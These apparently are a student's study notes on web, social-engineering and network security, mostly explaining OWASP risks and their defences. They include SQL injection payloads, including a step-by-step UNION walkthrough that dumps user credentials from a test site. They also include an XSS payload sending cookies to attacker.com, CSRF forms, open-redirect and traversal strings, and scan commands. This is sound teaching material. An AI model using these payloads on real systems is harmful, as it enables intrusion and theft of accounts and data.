# [LECT] Web security 

## owasp top10 web app security risk
1. sql injection
2. broken authentication and session management
3. sensitive data exposure
4. xml external entities
5. broken access control - unvalidated redirects and forwards
6. security misconfiguration
7. cross site scripting/cross site request forgery
8. insecure serialization/insecure direct object references
9. using components with known vulnerabilities
10. insufficient logging and monitoring


## sql injection

results from untrusted data from user being used as part of a query

data tricks the server/sql interpreter into executing commands or queries which it shouldnt 

access data that the user does not have authorisation for

```
$username=$_POST[“username"];
$password=$_POST["password"];
mysql_connect($database,"$db_username","$db_password");

$result = mysql_query("SELECT * from accounts WHERE
username = '$username' AND password = '$password'”);

if (mysql_num_rows($result)>0)
{ echo “Success";
redirect(); }
```
server side script takes a username and password from a form 

connects to a database executes query directly with username and password values from the form 

if username and password match then redirects to another page

### sql injection using `OR 1=1`

```
username: Fred'OR'1'='1
SELECT * from accounts WHERE username = ‘ Fred ‘ OR ‘ 1 ‘ = ‘ 1 ‘ AND password = ‘ $password ‘ LIMIT 1
```
it will return 1st matched row from accounts table since '1'='1' is always true

if you put a common password, chances are youll get into someones account

attack a specific user by gaining access with any password

#### how this works 
- single quotation terminates the string literal that wraps the username 

### sql injection using comments --
```
Username: ' OR 1=1--
$result = mysql_query("SELECT *
from accounts WHERE username = ' ' OR 1=1-- ' AND password = ' $password'”);
```
in this case we've used an empty string for username, and put in OR condition which is always true and commented out the rest of the query

#### how this works
- this is used to comment out the remainder of the sql statement, effectively ignoring it. it stops the sql execution right after the username check and bypasses the password check

### problem with allowing `'`
the use of `'` means the intepreter switches context from control command to data. 

need to sanitise user input
- escape characters which result in a context switch
- context is switched from a string value to a sql command and vice versa 

### sql injection using union
if attacker knows there is a date field/column from table in the db, the attacker can then make use of union

```
SELECT Date FROM Deposits
UNION
SELECT Date FROM Withdrawals
ORDER BY Date;
```
for union to work, two requirements are
- individual `select` must return the same number of columns
- data types in each column must be compatible between individual `select`

attack leverages the union of two or more `select` queries. primary goal of this attack is to manipulate the original query to extract data from different tables in the database. 

for example, assume application executes a query to fetch withdrawals table
```
SELECT Date FROM Withdrawals WHERE condition;
```

injected query - an attacker might input a value that modifies the query to use `union` to combine results from another table (deposits).
```
' UNION SELECT Date FROM Deposits --
```

resulting query will become 
```
SELECT Date FROM Withdrawals WHERE condition UNION SELECT Date FROM Deposits -- ;
```

### sql db - schema, table and column
a schema contains schema objects which includes tables, comlumns, data, types, views, stored procedures, relationships, keys etc.

a database may have one or more schema

### sql clauses and functions
batch sql - multiple sql statements can be separated by `;`

order by n- sorts the result set according to column <n>. when performing sqli, can use order by to determine number of columns in a table - increment column index till error is generated;

version() - shows version of current sql server and os

database() - shows name of current sql db

table_schema - name of database to which table belongs 

information_schema - contains db metadata (table name, name of column, access privileges). database contains tables (datasets), individual tables can be selected. 

### try sql injection in browser address bar

```
Browse to:
http://testphp.vulnweb.com/listproducts.php?cat=1
• Replace 1 with ‘

• Try this:
http://testphp.vulnweb.com/listproducts.php?cat=1order by 1

• Repeat,incrementing by 1 (finding no. of table columns)
```
once you hit 12, youll get unknown column. 

now you should know the number of columns (11).

```
Now, try this: 
http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,2,3,4,5,6,7,8,9,10,11
```

this means you want to extract out every single one of the 11 fields and put them together. the purpose of the negative sign is to trigger an error, and display the vulnerable columns. 

you'll see 2,7,9,11 displayed, telling you these columns are vulnerable. 

```
Now, try this: 
http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,version(),3,4,5,6,database(),8,9,10,11

• Extracting database, SQL version and OS
• Database name is acuart
• SQL version 8.0.22 and OS is Ubuntu 20.04.2
```

putting version(), database() in place of those vulnerable columns means you run an api at the position of those vulnerable columns and it might be executed. 

```
now try this
http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,2,3,4,5,6,7,8,9,10,group_concat(table_name) from information_schema.tables

• Extracting tables from SQL Database
• The table names artists, carts, ... etc. are displayed as a group
• All data regarding the table structure is in information_schema
• Set table_schema to database name
```
this gives all available table names

```
Now, try this: 
http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,2,3,4,5,6,7,8,9,10,group_concat(column_name) from information_schema.columns where table_name=‘users’

• Extracting the columns from the users table
• We can now zoom in to extract the interesting fields in the user records
```
this gives all available column name from table `users`

```
Now, try this: 
http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,2,3,4,5,6,7,8,9,10,concat(uname,0x3a,pass,0x3a,email,0x3a,name) from users -- 

(use -- to escape redirection)
• Extract the uname, pass, email and name from users table
• Repeat with the concat command string at other vulnerable columns 2 and 7
• 0x3a is the colon (:) used to separate the result
```
this will give you the infomation of the user based on
`username, password, email, name` of the table user. 

0x3a is the hex code for colon


### defense - escaping user defined input
you can escape characters which could be related to sql injection

remember single quote switches between data and command. once you escape it, it no longer has that capabilty. it would just be a text

```
$result = mysql_query("SELECT * from accounts
WHERE
username = ‘ \';DELETE FROM accounts\' ");

SELECT * from accounts WHERE
username = ' \\';DELETE FROM accounts\';
```
the `DELETE from accounts` command becomes a string, and loses the command functionality.

if attacker predicts escape characters, they can add another `/`, and the delete from account becomes active again.

Adding a \ would escape the \ character, thus opening up to SQL injection again

### defense - prepared statements
```
String uname = request.getParameter("userName");
String query = "SELECT fname, sname, address FROM users WHERE user_name = ? ";

PreparedStatement ps = connection.prepareStatement( query ); 
ps.setString(1, uname);

ResultSet results = ps.executeQuery( );
```
prepared statements with variable bindings aka parameterized queries defines the sql and then the parameters are passed in later. parameter is indicated by `?`, `1` is the order of the `?`. if there are `?,?,?...`, then we will have `1,2,3...`.

prepared statements may be fuond in the webserver db apis.

### defense - stored procedures
```
String custname = request.getParameter("customerName");
{ CallableStatement cs = connection.prepareCall("{call getAccountBalance(?)}");
cs.setString(1, custname);
ResultSet results = cs.executeQuery();
// ... result set handling
}
catch (SQLException se)
{ // ... logging and error handling }
```

similar to prepared statements, but stored in db. `?` replaces the fields. 

### defense - restricted access
sql views - restricts access to data so that users can only access their info

privileges - granted by schema owner to restrict access to objects in schema

reduce user input (date pickers)


## broken authentication and session management
errors in implementation.

authentication management, session management
- what problem could arise if the timeout wasnt set and user left public computer without clicking logout?
- what problem could arise if the passwords are poorly formed or werent salted and hashed before they were stored?
- what happens if transmitted session info is unencrypted

### broken authentication examples
1. url is forwarded accidentally or intentionally with session ids. when the receiver uses the link, the session and probably personal data can be compromised
```
example.com.jsessionid-2oefjsoiwenon...
```
session id is in the url in address bar

2. password spraying: an attack technique that attempts to target a large number of usernames with a few known or commonly used passwords. usually target single sign on SSO applications, cloud based applications and email applications.



## cross site scripting

attackers inject client side scripting into webpages which are shown to other users.

those users view the website with the malicious code which is executed in their browser. 

a malicious code is injected somewhere. appended into as entry data field, part of a link, or embedded into backend. 

### three types of xss
1. reflected xss
2. stored xss
3. dom based xss

### reflected or non persistent xss

malicious script bounces off a website to victims browser

it may be passed via a query or url, payload is not stored

if attack via url, need some social engineering to trick victim to click or hover the mouse pointer over the link. 

not stored persistently or permanently in the backend. 

### stored or persistent xss

stored means the malicious input is stored on the target server such as in a db, message forum, blog, image, comment field etc

an attacker identifies a forum as vulnerable

start a new topic and insert malicious scripts in the topic title or body. can also tag the topic using popular keywords so that the topic is a popular search result. 

malicious content of the forum post is stored by the server

when topic loads, malicious content is sent to the victims browser and payload executes.

### dom based xss

attacker crafts malicious code as part of a search query for a vulnerable website

victim is then tricked by attacker to click on the link and sends code to server

server returns a search page as response and victims browser executes legit script

adds html between the two div tags with teh id searchquery -> malicious codes runs.

dom - document object model. a programming interface for web documents. it represents the structure of a webpage as a tree of objects where each object corresponds to a part of the document such as elements, attributes and test. the dom allows scripts to update the content, structure and style of document dynamically. 

dom based xss is a type of xss attack where the malicious script is executred as a result of modifying the dom in the victims browser. this happens entirely on client side, meaning the server does not directly include the malicious script in its response. instead the client side script modifies the dom to include the attackers script. 

how dom based xss works
1. attacker crafts a malicious url. the attacker creates a url that incldues a malicious script within a query parameter.
```
http://website.com/search?keyword=<script>window.location='http://attacker.com?cookie='+document.cookie</script>
```
2. victim clicks on malicious link. the attacker tricks victim into clicking on the crafted url. this can be done through phishing emails, social engineering etc. the victims browser sends a request to the server with the malicious query parameter
3. server returns serch page. the server processes the request and returns a search result page. the server does not include the malicious script in its response
```
<html>
  <body>
    <h1>You Searched for:</h1>
    <div id="searchquery"></div>
    <script>
      var keyword = location.search.substring(3); // Extracts the search query
      document.querySelector('#searchquery').innerHTML = keyword; // Inserts the search query into the DOM
    </script>
  </body>
</html>
```

4. victims browser executres legitimate script. the browser executes the legitimate script on the page. the script extracts the search query from the url and inserts it into the dom. if the search query contains malicious javascript, it gets executed in the context of the page. 
5. malicious script is executed. the malicious script is now part of the dom and is executed by the browser. this script sends victims cookies to the attackers server
```
window.location='http://attacker.com?cookie='+document.cookie;
```
6. users sensitive information is sent to the attacker. the malicious script sends the victims sensitive information like cookies to the attackers server. the attacker can use this information to hijack the users session or perform other malicious actions. 

### xss malicious script examples
hijack user sessions - malicious script can access cookies, session tokens or other sensitive info retained by the browser and used with that site. given the session token, for example, it may be possible to spoof the user by constructing a request with this token (session hijacking)

deface websites - can potentialyl change html and deface websites if script is saved into web server

redirect user to malicious sites

### xss defence
1. have html slots where you can put untrusted data. 

2. html escape before inserting untrusted data into html element content. eg replace `<` with `&lt` and replace `>` with &gt as `<` and `>` are startings of a script. prevent switching into any execution context such as script style or event handlers. 
3. user input sanitization within server side input processing code.

## Insecure Direct Object References

an authorised user changes a parameter value which refers to an object they do have authorization for to one they dont. 

certain numbers or id should not be accessible by everyone

```
<html>
<head><title>User Details</title></head>
<body>
<?php
$userID = $_GET["id"];
$result = mysql_query("SELECT * from accounts WHERE userID= '$userID'");

while($row = mysql_fetch_array($result, MYSQL_NUM)) {
    $result .= $row[0];
}
echo $result;
?>
</body>
</html>

```

why is this an idor vulnerability
1. no validation or authorization. the script does not validate whether the currently authenticated user is authorized to access the data associated with the given userid.
2. direct access to internal objects. the userid parameter is directly used in teh sql query without any checks, allowing the attacker to manipulate it

exploiting the idor vulnerability
1. changing the id paramter. attacker can change the id parameter in the url to another users id. 
```
http://example.com/userdetails.php?id=124
```
2. the attacker can view details of other users by guessing or iterating over possible userid values.

### defense for idor
check access for each object (permissions)

use indirect object references

every web app should validate all untrusted inputs received with each https request. the app should at least perform whitelist validation on each input. this means verifying that the incoming vlaue meets the applications expectations for that input such as:
- minimum or maximum lenght
- minimum or maximum bounds for numeric values
- acceptable characters
- data type


## security misconfiguration
a web based systems security can be misconfigured at many levels: application, web server db. 

misconfiguration includes issues like not keeping software up to date. 

not patching vulnerabilities which could be exploited

using default user accoutns with default passwords 

thread agents: external attackers as well as insiders

more about best practices. when you set up any system, correct thing to do is to not use things like default user accounts. 

### security misconfig - directory traversal examples. 
a type of attack that allows attackers to access files and directories stored outside web root folder. 

1. using dork: google dorking is a technique used to find vulnerable sites or sensitive info. `intitle: index.of.accounts` can reveal directories listing account information 

2. example urls: urls like `https://users.cla.umn.edu/~erm/data/sr451/data/accounts/` might expose directories with sensitive data

3. Directory Traversal Attack: attacks `../../` is used to move up directory structure. evasive attacks `%2e%2e%2f` url encoded version of `../` to bypass simple input validation

4. examining disallowed paths: looking at `robots.txt` files to find disallowed paths can reveal sensitive directories that attackers might target. 

### security misconfig defense
dont use default settings, configure to your specific needs

apply principle of least privilege

run scans and audits 

have processes in place for checking software is up to date 


## sensitive data exposure

it occurs when an application, company or other entity inadvertently exposes personal data.

sensitive data exposure occurs as a result of not adequately protecting a data base where information is stored. 

### defense for sensitive data exposure

encrypt data in transport and at rest via strong encryption

store passwords with salted hashes

applying proper access controls to both files and directories

monitor account access logs for unusual activity

disable caching and auto complete on forms that collect data

employee traning/awareness

web vulnerability scanning


## missing function level access control
occur when requests for functionality are fulfilled without checking the user has authorisation 

a general user has access to some information, but not all (no access to admin)

### defense for missing function level access control
dont show the user functions which they should be able to access

check access to functionality before providing it

authorisation should be implemented for all functionality 

principle of least privilege

## cross site request forgery
an attack that tricks users to execute undesired actions on a web app in which they are currently authenticated. 

targest state chanigng requests, not data theft because attacker cannot see response to forged request

utilises social engineering support 

requires user to be logged in. makes use of user access level. 

### csrf attack example 1
1. attacker prepared malicious request, crafts a request url that performs a sensitive action such as transferring funds
```
http://example.com/app/transferFunds?amount=1500&destinationAccount=4673243243
```
2. embedding the request, attacker embeds the url in an image tage or hyperlink and sends to victim
```
<img src="http://example.com/app/transferFunds?amount=1500&destinationAccount=9876543210" width="0" height="0" />
```
3. victim clicks the link, a victim who is already authentication clicks the link. this action automatically sends the forged request to the target website without the victims knowledge
4. website executes the request, wbsite process the request as if it were legitimate action since the request includes the users session cookies. 

### csrf attack example 2
1. a legitimate request to change the email address might look like this 
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=ytvhwsztycQkP2cQ9bHgTvlyxHfSzfE

email=wiener@normal-user.com

```

2. the attacker creates a form that submits a similar request to change the email address
```
<html>
<body>
  <form action="https://vulnerable-website.com/email/change" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>

```

3. victim visits attackers page
   -   the attacker tricks victim into visiting the malicious page with hidden form
   -   when the victim browser loads the page, the form is automatically submitted because of javascript 
4. website change email address
   -   the website processes the request as if it was legitimate.

### csrf defence
include unpredictable challenge tokens for each session

for sensitive operations, include a challenge token in the html forms and links which execute sensitive server side operation. 

this hidden challenge token is then sent to server when the user tries to perform that operation

if a csrf attack is performed using a malicious site, the attacker needs to know the current token. your server will not process a request without this token so the attack fails. 

token is generated by server 

### challenge token generation
use less predictabe well established random number generator with enough entropy. 

use it like an otp: generate and use token for a single session, then generate again. 

expire token after a short amount of time so that they cannot be reused. 

use safe ways to verify whether the received token is the same as the set token, for example compare hashes


## using components with known vulnerabilities
also related to best practices.

known vulnerabilities are vulnerabilities that were discovered in open source components and published in the nvd, cve, security advisories or issue trackers

from the moment of publication, a vulnerability can be exploited by hackers who find the documentation

use of open source components is widespread - components may run with full privileges and/or expose you to serious attacks 

### defence for using components with known vulnerabilities
evaluate a components vulnerability before using it

keep components up to date

maintain complete software compoennt inventory 

keep track of attack surface baseline of endpoints that components are installed on 

eg. when set up laptop, you have certain softwares that automatically runs. in this case, if no need to use software, dont auto run it

best practice - maintain minimum baseline.


## unvalidated redirects and forwards
```
<?php
/* Redirect to anotherplace*/ header("Location:
http://www.anotherplace.co.uk/");
?>
www.trustedPlace.com?url=“somewhereBad.com”
<?php
$redirect_url = $_GET['url']; header("Location: " . $redirect_url);
?>
```

web application may redirect and forward users to other pages and websites

problem arises when untrusted data is used to determine the destination

### unvalidated redirect and forward examples
use dork `inurl:redirect.php?url= ; inurl:redirect?https ;`

Example 1 – https://madanglodge.com/?URL=http

Attack – Stop web page loading and type https://madanglodge.com/?URL=http://www.evil.com 

by manipulating the url parameter, an attacker can redirect users to a malicious site

when user clicks on the manipulated link, they are redirected to www.evil.com because the applciation does not validate or sanitize the url parameter.

example 2 search engine redirect - https://asia.google.com/search?btnI&q=http://www.indusface.com

search engines sometimes offer im feeling lucky feature `btnI` that can be manipulated to redirect to another site. if the search engine does not validate url properly, it could be used to redirect users to unintended or malicious sites. 

example 3 chained redirection - https://www.google.com.sg/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.artmusic.gr/redirect.php%3Faction%3Durl%26goto%3Dwww.akaipro.com

shows how url can be chained together to redirect through multiple sites, potentially making it hard to detect the final destination. if any of the sites involved do not validate the url parameter, attackers can exploit this to redirect users to a malicious site.



### defense for unvalidated redirect and forward
avoid redirects and forwards

dont allow the url as user input for the destination

have a list of trusted urls

have user confirm when they are leaving the site

simply avoid using redirect and forwards

# [PRAC] web sec practice qns
webSecTutorialSOLNS

1) sql injection. there is no sanitization for the username and password.

2) 
use `'--`to invalidate any sql queries after username and access the account
use `' OR 1 = 1` to accept any inputs for the password field

3) 
use escape characters such at `/` to invalidate any characters that toggles between command and strin like `'` 
**Correction: also add** use prepared statements for btoh username and password, and use stored procedures 

4) CSRF, cross site scripting
**Correction** only xss

5) input a malicious script into the comment
```
<script>alert("malicious script")</script>
```

6) sanitize all inputs for comments, so they become a string instead 

**Correction** use html slots for untrusted data, sanitize all inputs, use html escape characters like `&gt` 

7) insecure direct object reference IDOR.
8) attackers can change the parameters in the url in the address bar, leading them to access any webpages they arent authorized 
9) enable middleware authentications. constantly check if user is authenticated for a certain webpage. 
**add on** have server to verify access
10) conditions - user must be already logged in 
- craft a malicious link that supports what you wish to do, for example transfer funds from user account to another account
- send the link to the user via social engineering methods

11) generate challenge tokens and hide it in the delete.php. 
when the user clicks the link, this token would be verified by the server to see if the action is valid. 
ensure that the challenge token is a nonce, or randomly generated

12) sql injection, union 
`$query= mysql_query("SELECT title, author FROM books WHERE
title= '$book'");`

use sql UNION keyword to select from username and passwords from user

add escape characters, use prepared statements, use stored procedures, sanitize user inputs 

13) MD5 is known to have collisions and is proven to be insecure. use SHA 256

# [LECT] social engineering

## phishing
attempt to extract credentials by pretending to be from legitimate organization or individual 

kinds of information they want
- usernames and passwords
- banking account numbers
- credit card info
- access to or control systems 

kind of spoofing technique

attackers and victims not in physical contact

### phishing example 1
legitimate companies will not ask for personal info, nor will they supply a link in an email but rather ask you to log into their site directly from your browser and check your account

### phishing example 2
phishing email may have typos

### phishing example 3/4
malicious link may have link shorteners 

hover over links to check 

### phishing example 5
genuine email from professional enterprise will not ask you to do authentication based task

### non phishing example 6
genuine email does not ask to update password or particulars by clicking on a link, only review recent activity

### phishing example 7
phishing email header - look at full details of original message. look at the received header


### phishing example 8
awkward phrasing, from one company but the email service is another domain/emial exchange

### spear phishing
where the attacker is targeting specific user

they know abit about you from online profile

they know your name, email will be personalized

use url shorteners to hide actual link 

may contain malicious payload

### spotting phishing in general
- no identifying inforamtion in the addressing. not personialized, legitimate business will use personal salutations except for spear phishing
- "from" address in display doesnt match the full message details of "received from". misleading or different domain name
- awkward phrasing and spelling errors, less likely from business or professional enterprise
- creates a sense of urgency, mentions need for fast response or unrealistic threats. frighten you into doing something quick
- links to click on (hover, dont click). deceptive url redirecting you somewhere else or presence of shortened links
- ask for private personal or financial info
- compelled to validate or confirm your account by entering your authentication information

if is "dear customer", it should be generic, not personal like changing password

### phish tank

phish tank is a website which allows people to submit suspected phishing sites

they also provide an api which allows developers to check their site for websites which may be phishing 

but they need an existing link to do 1 to 1 match to tell you if its a phishing link. 

## pharming

a cyber attack that redirects a website traffic to another fake site

it can be conducted either by changing the hosts file on a victims computer, or by exploitation of a vulnerability in DNS server software 

1. type in url with domain, which is sent to dns which then translates that into an ip address
2. browser then conencts to the ip address and loads the website
3. one way of pharming is to poison the dns. local dns cache could be corrupted through a malware infection/attack
4. type in the legit address but are relocated to the attackers phishing website
5. pharming is less common than phishing

host file is a local file on computers that can be used to tell a computer how to resolve specific hosts to ip addresses without consulting outside dns servers

pharmin is online fraud that involves the use of malicious code to direct victims to spoofed websites in an attempt to steal their credentials and data

pharming is a process that begins with an attacker installing malicious code on a victims computer or server to modify the stored dns cache of the website. a victim will then be automatically redirected to the attacker's spoofed site based on the modified dns cache contents

a form of dns cache poisoning

alter the location to which the dns server directs the ip address to

example: go to system32/drivers/etc/hosts

attackers can change this host file

not common: effort to carry out is considerably more than phishing. pharming need to compromise the actual laptop

to know fake website, check the url at the top.




## no tech attacks - authority
people respect authority

different types of authority can be used, including:
- legal - based upon government and law. generally applies to law/saftey enforcement officers
- organizational - any authority defined by means of an organization, typically refers to supervisory hierachy
- social - social group could consist of co workers, college friends, or any other gathering of people. social authority can be used to an advantage in a social engineering engagement by asking or pressuring the target for information 

## no tech attacks - charm (empathy)

## no tech attacks - pretext
attackers focus on creating a good pretext or fabricated scenario

they prepare for expected questions

used to try and steal their victims personal inforamation/targeted objects

more advanced attacks sometimes try to trick their targets into doing something that abuses an organizations digital and/or physical weaknesses. 

## no tech attacks - baiting
use a false promise to pique a victims greed or curiousity

lure users into a trap that steals their personal information or inflicts their systems with malware

use of physical media to disperse malware. eg leaving malware infected flash drives

online forms of baiting consist of enticing ads that lead to malicious sites or that encourage users to downlaod a malware infected application.

## no tech attacks - reciprocation
reciprocity is an expectation that you will treat others the way they treat you

people dont want to be indebted

manipulating somebody to feel grateful or obligated to social engineer

manipulating a victim into compliances by promising. eg potential benefits in the future 


# [LECT] network security 

defense in depth - defences are layered, main objective is to delay the attack progress rather than to stop it at the onset

first level - firewalls and proxies control access to and from unauthorized networks and will allow or block traffic based on a set of security rules

second level - intrusion detection/protection systems detect and protect agaisnt malicious network activity; typically signature based

third level - vpn provides encryption over a public ip network

network security in layers
1. advanced threat protection 
2. intrusion detection prevention
3. web security
4. email security 
5. forensic analysis 
6. data loss prevention
7. network generation firewalls
8. security event monitoring 

## firewall
can be implemented as hardware or software appliance

monitors and filters network traffic - dmz, zone segregation

combination of security mechanism 

can support vpn

a bad rule only looks for requests from port 80 to port 80, but we can have http requests from any port between 1024 - 65535 so traffic could still be let through 

## attacks firewall mitigates against
port scannign will have limited results as can lock down access to ports

could use it to stop war driving, requests allowed only from specific ip addresses 

limited help with dos/ddos - stop a lot of requests from unwanted sources but cannot protect agaisnt complex ddos 

cannot protect agaisnt bypass attacks 

reflection occurs when an attacker forges the source address of request packets, pretending to be the victim. servers are unable to distinguish legitimate from spoofed requests when udp is used. 

attack caused exploited memcached servers to send huge amounts of traffic to the victim

port scanning - scan the ports, those that are open, those that are filtered and those that are closed and find the services running behind. a technique used by attackers to identify open ports and services available on host. firewall mitigate port scannign by restricting access to specific ports.

war driving - scanning for ssid (like the wifi). involves searching for wifi networks by moving around a specific area. firewalls limit requests to those coming from specific ip addresses.

dos/ddos - stopping conventional dos is simple, just drop the packets. some uses ddos where it is udp, no need acknowledgement, more difficult to prevent as it can pile up. 

to find if server is vulnerable, do a port scan and look at memcache. if memcache state is open, it is vulnerable to ddos.

## packet filtering
a packet filtering firewall tests each packet that crosses the firewall according to a set of user defined rules

most common type of firewall

security rules pass/block/filter traffic based on port, ip addresses, ip protocol

hardware and software packet filtering

stateless and stateful

can be implemented by software and hardware

firewall behaves almost like a packet filter

stateless means no memory

stateful means some memory

stateless packet filter - does not look at the state of connections but just as the packets themselves. an example is the extended access control lists on cisco ios routers. 

stateful packet filter - aware of the connections that pass through it. it adds and maintains information about a user's connections in a state table. it then uses this table to implement the security policies for users connections

stateless firewall only examines a packet, looks at header, compares with rules, and decide what to do with it. not very secure as it doesnt look at whole picture

stateful firewall based on checking state tables. look at connections over time. look at scenario then make a decision. security is higher. 

## stateless vs stateful

| parameters               | stateless                                                               | stateful                                                                                                       |
| ------------------------ | ----------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| philosophy               | treats each packet in isolation and does not relate to connection state | stateful firewalls maintain context about active sessions and use state information to speed packet processing |
| filtering decisions      | based on information in packet headers                                  | based on flows                                                                                                 |
| memory and cpu intensive | low                                                                     | high                                                                                                           |
| security                 | low                                                                     | high                                                                                                           |
| connection status        | unknown                                                                 | known                                                                                                          |
| performance              | fast                                                                    | slower                                                                                                         |
| related terms            | header info, ip address, port no                                        | state inforamiton, pattern matching                                                                            |

## intrusion detection system
network intrusion detection system nids detects unauthorized access to network and host resources without needing traffic flow through it

nids can be connected to a hub based network in promiscuous mode or to a switch based network via port monitoring to monitor multiple/different clients

nids monitoring can be extended via host based ids or agents to cover a larger network scope. 

hub based network - a broadcast network. just connect nids to hub and monitor the traffic. needs to be in promiscuous mode. bad thing is if have unauthorised party connected to hub, he can listen to every thing.

switch based network - any sender to receiver is one to one connection. also can broadcast, but will be broadcasted as one to one. use port mirroring to connect the nids to the network. means anything that goes through a port is mirrored or copied to the nids port so nids can hear whats going on. 

can have several switches, too expensive to connect so many nids to switches. one way is to use software approach: a software agent called hids is installed in the devices. it will listen out to any traffic on the endpoint and send it to the nids. 

nids can monitor more flexibly and cover a large scope compared to firewall.

able to support monitoring of iot networks via gateway installed agents. 

supports deep packet inspection. examines both header and data sections of packet in greater detail that just packet filtering.

signature based or statistical anomaly based detection techniques

can be used as part of ips. 

a network may not just contain IT devices. IT networks may connect operational technology devices. in this case, they are too small to install hids on these devices. in this case we can make use of iot gateways. installing hids at gateway level is possible to collate all the packets from all the operational tech devices. but how is hids going to pinpoint the packet from the individual iot devices? this case we use dpi. dpi will inspect the packet deeply, to see if there are malicious commands. 

## intrusion protection systems 

a network intrustion prevention system nips does what a nids does plus automated responses to block intrusions, protect agaisnt system hijacking and data theft, including changing firewall settings

nips is usually located inline between firewall and the protected network and thus requires greater logging capacity and ability to respond in real time. 

nids nips are quite similar, but detection system only generates alarm. nips will try to protect as well. nids is connected to switch but not inline in the channel. nips is connected inline in the channel. nips requires more resources.

## proxies
proxy firewall also called an application gateway, protects network resources by re directing web requests at the application layer. 

scans incoming traffic for application layer protocols like ftp and http and offers deep packet inspection of the incoming data packets for possible maliciousness. 

functioning at high level in teh network stack enable them to detect and address spoofing and other sophisticated attacks

examins the data for content that is not allowed, can limit applications supported by network.

provides private or anonymouse internet access, hides ip address

somwhat similar to firewall and router. acts like a middleman. some use it inplace of firewall, or in addition with a firewall. doesnt make use of rules. after it scans traffic and determine its safe, it will redirect to destination like a router. 

have extensive logging capabilties dues to ability to examine contents of the entire network packet rather than just addresses and ports

it can also cache frequently accessed web pages to reduce network traffic, improve network performance.

may not be well suited for real time or high bandwidth applications.

security software in proxy only designed to stop at application layer. 

## vpn
vpn allows you to extend a private network across a public one such as the internet. https only provides encryption between the website and your browser.

https and vpn does encryption. the differenc is for https encryption only exist between you and the site. if you move to another site, it wont exist anymore. vpn creates virtual network with encryption and overlays on unsafe channel, so whereever you connect the encryption stays there.

## vpn sub systems
authentication - users must be authenticated before secure tunnel is established.

tunnelling - process by which vpn packets reach intended destination, establishing secure network between user and internet via vpn server. a tunnel management protocol is used as the mechanism to create, maintain and terminate the tunnel. 

encryption and ip masking - to protect data travllign through tunnel and user privacy. 

authentication means not everyone can use, must be registered. the virtual network created over unsafe channel is encapsulated by a tunnel. the tunnel cannot use internet protocol as it is an overlay. so it uses its own protocol: internet protocol security ipsec and transport layer security tls. packets are encrypted and decrypted by the server when traveling through the tunnel.

## ipsec vs tls
layer 2 tunelling protocol l2tp is a tunnelling protocol implemented with ipsec for security. 

openvpn is an open soruce s/w implementing vpn techniques and uses tls for key exchange.

## honeypot for network defence
a honeypot acts as a decoy often set up in a vm or clpud server connected to network but isolated and monitored. 

honeypots are designed to be intentionally vulnerable with weaknesses that get detected by a port scanner who will then try to exploit

a properly configured honeypot should have many of the same features of your production system, attacker should not be put on alert of its presence

a bait

maybe supported by ai: if attack drops (attacker knows its a honeypot), it will reconfigure as a new system

## receiving and sending packets
a hub receives incoming data packets and sends them out to all nodes. the nodes ignores packets if its not addressed to them

switches similar to hubs, but knows which connection goes to which node using mac addresses, so sends packets to the right node. 

router provide connectsion to internet, and they protect hte lan from the internet.

## port scanning
a process which checks a hosts ports to see which are open, closed or filtered and listens to data arriving at and leaving a port.

## basic scans 
use zenmap quick scan and see ports, then search on vulnerability databases. 

## tcp connect scan
also known as vanilla scan

if port is reachable, connect to it for further probing

nmap -sT -p (all ports or a specific one)

filtered port - no response

how it works
1. sneder sends syn packet
2. if port is open, receiver sends syn ack back. if port is filtered, receiver sends nothing back and will have a timeout. if port is closed, receiver sends rst ack back 
3. if port is open, sender sends ack back to receiver
4. data transfer will then takes place

### pros and cons of tcp connect scan
pros
- no special privileges are required to urn the tcp connect scan
- accurate in determining tcp services
- can distinguish among open, closed and filtered 

cons
- time consuming, scanning speed is slow
- this kind of scan is easily detected by ids/ips as it is noisy, involves many packets and likely to be logged by system
- inspecting the target's log will show a number of connections and error messages immediately after each one of them was initiated.

## tcp syn scan/half open scan
how it works
1. sender sends syn 
2. if port is open, receiver sends syn ack back. if port is filtered, receiver sends nothing back and will have a timeout. if port is closed, receiver sends rst ack back. 
3. when port is open, sender sends rst and end handshake so no connection is established 

we immediately tear down the connection by sending a rst but port remains open (nmap -PS)

### pros and cons of half open scan
pros
- faster than txp connect scan
- stealthy, most target hosts do not log such scan attempts. 
- able to differentiate among open, closed and filtered ports

cons
- require privilege access as root or admin
- some firewalls and packet filters watch for syns to restrict ports

## advanced port scanning techniques
random scan - randomize the sequence of targets and ports probed as well as scannign intervals may prevent detection 

slow scan - some hackers are very patient and can use network scanners that spread out the scan over a long period of time. the scan rate can be as low as 2 packets per day per target site. can bypass several ids.

fragmentation scan - in case of tcp, the 8 bytes of data (minimum fragment size) are enough to contain the source and destination port numbers. this will force the tcp flags field into the second fragment. may hide scan from some firewalls and ids.

decoy scan - some network canners include options for decoys or spoofed addresses in their attacks. if many decoys are used, determining who the real attacker is will be nearly impossible. 

coordinated scan - group scanning based on stratget or plan, cover target more efficiently

random and slow scan usually used together. looks like genuinely user interacting with network. 

in a typical network traffic, different protocols being used. each of them will have different packet header values. some firewall recognize the headers. attackers break the header up into two, the firewall no longer can detect. 

coordinated scan used by a team of attackers. 

### fragmentation scan 
all ip packets that carry data can be fragmented. 

split probe packet into several ip fragments

some firewalls and ids may incorrectly reassemble or completely miss portions of the scan. they may assume that this was just another segment of traffic that has already passed through their access list. 

advantage: difficult to detect scan

disadvantage: may not work on all OS, may crash some firewalls and ids.

### decoy scan
used to confuse the target

send spoofed probe packets with fake source addresses to target. one of them must be real

more difficult to determine the actual scanner

more decoys - slower scanning

## router
anyone close to your router can get on wifi hotspots
war driving, mapping of wifi access points - locate and potentially exploit
evil twin - fake wifi access point that appears to be legit but is set up to eavesdrop on wireless communications

## hotspot hijacking attack
